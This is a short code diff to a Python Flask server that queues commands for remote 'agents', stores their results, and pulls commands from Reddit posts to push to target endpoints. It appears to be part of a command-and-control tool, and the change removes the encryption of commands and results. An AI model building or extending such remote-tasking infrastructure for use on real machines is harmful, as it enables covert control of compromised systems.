@@ -121,15 +121,14 @@ def queue_command():
     if not agent_id or not cmd_text:
         return jsonify({"error": "agent_id and command required"}), 400
 
-    plain_cmd = decrypt(cmd_text)
-    new_cmd = Command(agent_id=agent_id, command=plain_cmd, status="Queued")
+    new_cmd = Command(agent_id=agent_id, command=cmd_text, status="Queued")
     db.session.add(new_cmd)
     db.session.commit()
 
     return jsonify({
         "status": "queued",
         "agent_id": agent_id,
-        "command": plain_cmd,
+        "command": cmd_text,
         "command_id": new_cmd.id
     })
 
@@ -146,7 +145,7 @@ def result():
     command = Command.query.get(cmd_id)
     if command:
         command.status = "Completed"
-        command.result = decrypt(output)
+        command.result = output
         command.completed_at = datetime.now(timezone.utc)
         db.session.commit()
 
@@ -253,7 +252,7 @@ def poll_reddit():
 
             for endpoint in targets:
                 for command in commands:
-                    payload = {"agent_id": endpoint, "command": encrypt(command)}
+                    payload = {"agent_id": endpoint, "command": command}
                     requests.post(f"http://{SERVER_HOST}:{SERVER_PORT}/queue", json=payload)
 
             requests.post(f"http://{SERVER_HOST}:{SERVER_PORT}/processed", json={"post_id": post.id})
